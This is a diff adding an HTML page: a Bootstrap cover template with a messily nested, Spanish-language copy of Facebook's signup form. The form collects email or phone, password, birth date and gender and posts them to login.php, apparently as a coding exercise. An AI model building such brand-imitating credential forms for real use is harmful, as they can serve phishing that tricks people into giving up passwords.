@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="en" class="h-100" data-bs-theme="auto">
+  <head><script src="assets/js/color-modes.js"></script>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+    <meta name="generator" content="Hugo 0.122.0">
+    <title>Cover Template · Bootstrap v5.3</title>
+
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.3/examples/cover/">
+
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3">
+
+<link href="assets/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+      .bd-placeholder-img {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "poppins", sans-serif;
+      }
+      body{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 80vh;
+        background-color:#f0f4fa;
+        padding: 30px;
+        font-size: 1.125rem;
+        text-anchor: middle;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        user-select: none;
+      }
+        
+      
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 1.5rem;
+        }
+        body {
+  background-color: #b1ada6;
+  background-image: url("Druparne.jpg");
+}
+      }
+
+      .b-example-divider {
+        width: 400px;
+        height: 2rem;
+        background-color: rgba(207, 195, 195, 0.76);
+        padding: 30px;
+        margin: auto;
+        margin-top: 100px;
+        border-radius: 4px;
+        font-family: 'calibri';
+        border: solid rgba(207, 195, 195, 0.753);
+        border-width: 1px 0;
+        box-shadow: inset 0 .5em 1.5em rgba(207, 195, 195, 0.753), inset 0 .125em .5em rgba(207, 195, 195, 0.753);
+      }
+
+      .b-example-vr {
+        flex-shrink: 0;
+        width: 1.5rem;
+        height: 70vh;
+      }
+
+      .bi {
+        vertical-align: -.125em;
+        fill: currentColor;
+      }
+
+      .nav-scroller {
+        position: relative;
+        z-index: 2;
+        height: 2.75rem;
+        overflow-y: hidden;
+      }
+
+      .nav-scroller .nav {
+        display: flex;
+        flex-wrap: nowrap;
+        padding-bottom: 1rem;
+        margin-top: -1px;
+        overflow-x: auto;
+        text-align: center;
+        white-space: nowrap;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .btn-bd-primary {
+        --bd-violet-bg: #712cf9;
+        --bd-violet-rgb: 112.520718, 44.062154, 249.437846;
+
+        --bs-btn-font-weight: 600;
+        --bs-btn-color: var(--bs-white);
+        --bs-btn-bg: var(--bd-violet-bg);
+        --bs-btn-border-color: var(--bd-violet-bg);
+        --bs-btn-hover-color: var(--bs-white);
+        --bs-btn-hover-bg: #6528e0;
+        --bs-btn-hover-border-color: #6528e0;
+        --bs-btn-focus-shadow-rgb: var(--bd-violet-rgb);
+        --bs-btn-active-color: var(--bs-btn-hover-color);
+        --bs-btn-active-bg: #5a23c8;
+        --bs-btn-active-border-color: #5a23c8;
+      }
+
+      .bd-mode-toggle {
+        z-index: 1500;
+      }
+
+      .bd-mode-toggle .dropdown-menu .active .bi {
+        display: block !important;
+      }
+    </style>
+
+    
+    <!-- Custom styles for this template -->
+    <link href="cover.css" rel="stylesheet">
+  </head>
+  <body class="d-flex h-100 text-center text-bg-dark">
+    <svg xmlns="http://www.w3.org/2000/svg" class="d-none">
+      <symbol id="check2" viewBox="0 0 16 16">
+        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+      </symbol>
+      <symbol id="circle-half" viewBox="0 0 16 16">
+        <path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"/>
+      </symbol>
+      <symbol id="moon-stars-fill" viewBox="0 0 16 16">
+        <path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+      </symbol>
+      <symbol id="sun-fill" viewBox="0 0 16 16">
+        <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+      </symbol>
+    </svg>
+
+    <div class="dropdown position-fixed bottom-0 end-0 mb-3 me-3 bd-mode-toggle">
+      
+        </li>
+      </ul>
+    </div>
+
+
+  <main class="px-2">
+    <p style="color:#dbdee2"></p>
+  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>facebook</title>
+</head>
+<body>
+    <!--este formulario iniciara la sesion-->
+    <form method=" post" action="login.php">
+      <fieldset>
+      <h1 style="color:#0000ff">	
+        <p>facebook</p></h1>
+        <h1 style="color:#151516"><p style="text-align:center">Crea una cuenta</p></h1>
+        <p style="text-align:center"> Es rápido y facil</p>
+      <p style="text-align:center"></p>
+            <input type="text"name="txt_correo electronico o numero de telefono" placeholder="correo electronico o numero de telefono">
+        <input type="text"name="txt_contraseña" placeholder="contraseña">
+        <br>
+        <br>fecha de nacimiento? <br>
+        
+            <select name="día">
+              <option value="0">00</option>
+              <option value="1">01</option>
+              <option value="2">02</option>
+              <option value="3">03</option>
+              <option value="4">04</option>
+              <option value="5">05</option>
+              <option value="6">06</option>
+              <option value="7">07</option>
+              <option value="8">08</option>
+              <option value="9">09</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+              <option value="13">13</option>
+              <option value="14">14</option>
+              <option value="15">15</option>
+              <option value="16">16</option>
+              <option value="17">17</option>
+              <option value="18">18</option>
+              <option value="19">19</option>
+              <option value="20">20</option>
+              <option value="21">21</option>
+              <option value="22">22</option>
+              <option value="23">23</option>
+              <option value="24">24</option>
+              <option value="25">25</option>
+              <option value="26">26</option>
+              <option value="27">27</option>
+              <option value="28">28</option>
+              <option value="29">29</option>
+              <option value="30">30</option>
+              <option value="31">31</option>
+            </select>
+            <select name="mes">
+              <option value="1">-----</option>
+              <option value="1">enero</option>
+              <option value="2">febrero</option>
+              <option value="3">marzo</option>
+              <option value="4">abril</option>
+              <option value="5">mayo</option>
+              <option value="6">junio</option>
+              <option value="7">julio</option>
+              <option value="8">agosto</option>
+              <option value="9">septiembre</option>
+              <option value="10">octubre</option>
+              <option value="11">nobiembre</option>
+              <option value="12">diciembre</option>
+          </select>
+            <select name="Año">
+              <option value="1">0000</option>
+              <option value="1">1950</option>
+              <option value="2">1951</option>
+              <option value="3">1952</option>
+              <option value="4">1953</option>
+              <option value="5">1954</option>
+              <option value="6">1955</option>
+              <option value="7">1956</option>
+              <option value="8">1957</option>
+              <option value="9">1958</option>
+              <option value="10">1959</option>
+              <option value="11">1960</option>
+              <option value="12">1961</option>
+              <option value="13">1962</option>
+              <option value="14">1963</option>
+              <option value="15">1964</option>
+              <option value="16">1965</option>
+              <option value="17">1966</option>
+              <option value="18">1967</option>
+              <option value="19">1968</option>
+              <option value="20">1969</option>
+              <option value="21">1970</option>
+              <option value="22">1971</option>
+              <option value="23">1972</option>
+              <option value="24">1973</option>
+              <option value="25">1974</option>
+              <option value="26">1975</option>
+              <option value="27">1976</option>
+              <option value="28">1977</option>
+              <option value="29">1978</option>
+              <option value="30">1979</option>
+              <option value="31">1980</option>
+              <option value="32">1981</option>
+              <option value="33">1982</option>
+              <option value="34">1983</option>
+              <option value="35">1984</option>
+              <option value="36">1985</option>
+              <option value="37">1986</option>
+              <option value="38">1987</option>
+              <option value="39">1988</option>
+              <option value="40">1989</option>
+              <option value="41">1990</option>
+              <option value="42">1991</option>
+              <option value="43">1992</option>
+              <option value="44">1992</option>
+              <option value="45">1993</option>
+              <option value="46">1994</option>
+              <option value="47">1995</option>
+              <option value="48">1996</option>
+              <option value="49">1997</option>
+              <option value="50">1998</option>
+              <option value="51">1999</option>
+              <option value="52">2000</option>
+              <option value="53">2001</option>
+              <option value="54">2002</option>
+              <option value="55">2003</option>
+              <option value="56">2004</option>
+              <option value="57">2005</option>
+              <option value="57">2006</option>
+              <option value="59">2007</option>
+              <option value="60">2008</option>
+              <option value="61">2009</option>
+              <option value="62">2010</option>
+              <option value="63">2011</option>
+              <option value="64">2012</option>
+              <option value="65">2013</option>
+              <option value="66">2014</option>
+              <option value="67">2015</option>
+              <option value="68">2016</option>
+              <option value="69">2017</option>
+              <option value="70">2018</option>
+              <option value="71">2019</option>
+              <option value="72">2020</option>
+              <option value="73">2021</option>
+              <option value="74">2022</option>
+              <option value="75">2023</option>
+              <option value="76">2024</option>
+              <option value="77">2025</option>
+              <option value="78">2026</option>
+              <option value="79">2027</option>
+              <option value="80">2028</option>
+              <option value="81">2029</option>
+             
+                </select>
+                  <br>
+                  <br>Género? <br>
+               <table>
+                <input type="radio" name="radio1" value="Mujer">Mujer
+                <input type="radio" name="radio1" value="Hombre">Hombre
+                <input type="radio" name="radio1" value="Personalizado">Personalizado
+              </table>
+              <input type="text"name="txt_Número de celular o correo electrónico" placeholder="Número de celular o correo electrónico">
+              <input type="text"name="txt_Contraseña" placeholder="Contraseña">
+              <p>
+              <footer class="mt-auto text-white-50">
+              <p> Es posible que las personas que usan <br>nuestro servicio hayan subido tu<br> información de contacto a Facebook.<a href="https://es-la.facebook.com/help/637205020878504" class="text-white">Más información</a></p>
+              </footer>
+              <footer class="mt-auto text-white-50">
+                <p>Al hacer clic en "Registrarte", aceptas nuestras <a href="https://es-la.facebook.com/legal/terms/update" class="text-white"><br>Condiciones,</a> 
+                 la <a href="https://es-la.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0" class="text-white">Política de privacidad. </a> y la<a href="https://es-la.facebook.com/privacy/policies/cookies/?entry_point=cookie_policy_redirect&entry=0" class="text-white">Política de cookies. </a>  <br>
+                 Es posible que te enviemos notificaciones por SMS,<br>
+                 que puedes desactivar cuando quieras.</p>
+                </footer>
+                <style>
+                  .btb{background-color:rgba(90, 221, 107, 0.781);color:rgba(241, 239, 239, 0.952);width:120px;}
+                  </style>
+                  <p style="text-align:center"><button class="bt2 btb">Registrarte</button></p></h1>              
+                
+                  </footer>
+                
+            </fieldset>    
+        </select>
+
+    </form>
+
+</body>
+</html>
+    
+  </main>
+
+  <footer class="mt-auto text-white-50">
+</div>
+<script src="assets/dist/js/bootstrap.bundle.min.js"></script>
+
+    </body>
+</html>
